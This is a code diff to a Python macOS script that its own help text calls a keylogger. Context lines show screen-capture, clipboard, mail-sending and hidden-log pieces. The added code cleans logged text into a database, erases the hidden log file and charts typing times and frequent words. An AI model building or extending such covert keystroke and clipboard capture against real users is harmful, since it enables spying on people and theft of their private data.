@@ -7,13 +7,18 @@ import argparse
 from PIL import ImageGrab
 from AppKit import NSPasteboard, NSStringPboardType
 from multiprocessing import Process, freeze_support
+import re
 
 import mail_handler as md
 import db_handle as dh
+from vis_data import vis_timeslots, vis_top_words
 
 parser = argparse.ArgumentParser()
 parser.add_argument('--keylog', help='run keylogger.', action="store_true")
 parser.add_argument('--to_db', help='read log file and log into the database.', action="store_true")
+parser.add_argument('--load', help='load dataset.', action="store_true")
+parser.add_argument('--vis_time', help='visualize time slots.', action="store_true")
+parser.add_argument('--vis_freq', help='visualize top frequent words.', action="store_true")
 args = parser.parse_args()
 
 # define the path of log file.
@@ -23,6 +28,12 @@ log_file = path + '/.log'
 send = True
 newTimer = False
 prev_clipboard = ''
+
+
+def load_dataset():
+    with open('dataset.txt', 'r') as f1, open(log_file, 'a') as f2:
+        log = f1.read()
+        f2.write(log)
 
 
 def log_to_db():
@@ -41,8 +52,16 @@ def log_to_db():
             VALUES (?, ?, ?)
         """
         info = json.loads(info)
-        params = (res[0][0], info["msg"], info["time"])
-        dh.SQLupdate(query, params)
+        # remove pnctuations, numbers and convert the string to lowercase.
+        info["msg"] = re.sub(r'[^\w\s]', '', info["msg"])
+        info["msg"] = re.sub('[^A-Za-z0-9 ]+', '', info["msg"])
+        info["msg"] = info["msg"].lower()
+        print(info["msg"], len(info["msg"]))
+        if len(info["msg"]) > 0:
+            params = (res[0][0], info["msg"], info["time"])
+            dh.SQLupdate(query, params)
+    # erase the log file.
+    open('.log', 'w').close()
 
 
 def is_send():
@@ -144,5 +163,11 @@ if __name__ == '__main__':
                 newTimer = False
     elif args.to_db:
         log_to_db()
+    elif args.load:
+        load_dataset()
+    elif args.vis_time:
+        vis_timeslots()
+    elif args.vis_freq:
+        vis_top_words()
     else:
         pass
